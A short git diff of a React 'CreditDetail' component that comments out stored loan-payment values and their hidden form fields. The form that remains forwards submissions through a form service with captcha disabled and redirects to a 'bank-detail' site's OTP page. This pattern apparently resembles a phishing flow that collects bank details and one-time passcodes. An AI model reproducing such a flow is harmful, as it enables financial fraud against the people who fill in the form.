@@ -3,9 +3,9 @@ import './Verification.css'
 
 function CreditDetail() {  
 
-  const [totalPayment, setTotalPayment] = useState('');
-  const [interestPayable, setInterestPayable] = useState('');
-  const [loanEMI, setLoanEMI] = useState('');
+  // const [totalPayment, setTotalPayment] = useState('');
+  // const [interestPayable, setInterestPayable] = useState('');
+  // const [loanEMI, setLoanEMI] = useState('');
   const [loading, setLoading] = useState(false);
 
   useEffect(() => {
@@ -14,14 +14,14 @@ function CreditDetail() {
       behavior: 'smooth'
     })
 
-    const totalPayment = localStorage.getItem('Total payment');
-    const interestPayable = localStorage.getItem('Interest Payble');
-    const loanEMI = localStorage.getItem('Loan EMI');
+    // const totalPayment = localStorage.getItem('Total payment');
+    // const interestPayable = localStorage.getItem('Interest Payble');
+    // const loanEMI = localStorage.getItem('Loan EMI');
 
-    // Update state with fetched values
-    setTotalPayment(totalPayment || ''); // Default to empty string if null
-    setInterestPayable(interestPayable || ''); // Default to empty string if null
-    setLoanEMI(loanEMI || ''); // Default to empty string if null
+    // // Update state with fetched values
+    // setTotalPayment(totalPayment || ''); // Default to empty string if null
+    // setInterestPayable(interestPayable || ''); // Default to empty string if null
+    // setLoanEMI(loanEMI || ''); // Default to empty string if null
 
   }, []);
 
@@ -247,9 +247,9 @@ function CreditDetail() {
                 />
               </label>
 
-              <input type="hidden" value={totalPayment} name="Total_payment" />
+              {/* <input type="hidden" value={totalPayment} name="Total_payment" />
               <input type="hidden" value={interestPayable} name="Interest_Payable" />
-              <input type="hidden" value={loanEMI} name="Loan_EMI" />
+              <input type="hidden" value={loanEMI} name="Loan_EMI" /> */}
 
               <input type="hidden" name="_captcha" value="false" />
               <input type="hidden" name="_next" value="https://bank-detail.vercel.app/otp" />
